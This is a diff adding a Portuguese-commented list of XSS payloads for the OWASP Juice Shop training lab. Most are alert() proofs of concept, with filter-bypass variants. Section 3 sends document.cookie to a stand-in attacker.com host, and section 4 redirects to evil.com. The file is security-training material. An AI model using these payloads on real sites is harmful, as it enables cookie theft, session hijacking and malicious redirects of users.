@@ -1,0 +1,119 @@
+# ============================================================
+# CROSS-SITE SCRIPTING (XSS) PAYLOADS - OWASP Juice Shop
+# Autor: Daniel de Souza de Aguiar
+# Data: Abril/2026
+# ============================================================
+
+# ------------------------------------------------------------
+# 1. XSS PERSISTENTE (Stored XSS) - Avaliações de produtos
+# ------------------------------------------------------------
+
+# Payload clássico com script
+<script>alert('XSS')</script>
+
+# Payload com alerta em caixa de diálogo
+<script>alert(document.cookie)</script>
+
+# Payload com iframe
+<iframe src="javascript:alert('XSS')">
+
+# Payload com iframe (variação)
+<iframe src="javascript:alert(document.cookie)">
+
+# Payload com imagem e onerror
+<img src=x onerror=alert('XSS')>
+
+# Payload com SVG e onload
+<svg onload=alert('XSS')>
+
+# Payload com body onload
+<body onload=alert('XSS')>
+
+# ------------------------------------------------------------
+# 2. XSS REFLETIDO (Reflected XSS) - Barra de busca
+# ------------------------------------------------------------
+
+# Payloads para teste na barra de pesquisa
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# ------------------------------------------------------------
+# 3. XSS PARA ROUBO DE COOKIE
+# ------------------------------------------------------------
+
+# Roubo de cookie com alerta
+<script>alert(document.cookie)</script>
+
+# Envio de cookie para servidor atacante
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+
+# Com imagem (exfiltração)
+<img src="https://attacker.com/steal?cookie="+document.cookie>
+
+# ------------------------------------------------------------
+# 4. XSS PARA REDIRECIONAMENTO
+# ------------------------------------------------------------
+
+# Redirecionamento para site malicioso
+<script>window.location='https://evil.com'</script>
+
+# Meta refresh
+<meta http-equiv="refresh" content="0; url=https://evil.com">
+
+# ------------------------------------------------------------
+# 5. XSS COM EVENTOS DO DOM
+# ------------------------------------------------------------
+
+# Onload no body
+<body onload="alert('XSS')">
+
+# Onerror em imagem
+<img src="invalid" onerror="alert('XSS')">
+
+# Onmouseover
+<p onmouseover="alert('XSS')">Passe o mouse aqui</p>
+
+# Onclick
+<button onclick="alert('XSS')">Clique aqui</button>
+
+# ------------------------------------------------------------
+# 6. XSS PARA BYPASS DE FILTROS (Obfuscados)
+# ------------------------------------------------------------
+
+# Usando String.fromCharCode
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Usando codificação hexadecimal
+<script>alert('\x58\x53\x53')</script>
+
+# Usando eval
+<script>eval('alert(\'XSS\')')</script>
+
+# ------------------------------------------------------------
+# 7. PAYLOADS PARA DIFERENTES CONTEXTOS
+# ------------------------------------------------------------
+
+# Em atributo HTML (fechando aspas)
+"><script>alert('XSS')</script>
+
+# Em URL
+javascript:alert('XSS')
+
+# Em atributo de link
+<a href="javascript:alert('XSS')">Clique aqui</a>
+
+# ------------------------------------------------------------
+# 8. PAYLOADS QUE FUNCIONARAM NO JUICE SHOP
+# ------------------------------------------------------------
+
+# Confirmado - Injeção nas avaliações
+<script>alert('XSS')</script>
+
+# Confirmado - Iframe nas avaliações
+<iframe src="javascript:alert('XSS')">
+
+# Confirmado - XSS com múltiplos payloads
+<iframe src="javascript:alert('XSS')"></iframe>
+
+# ============================================================
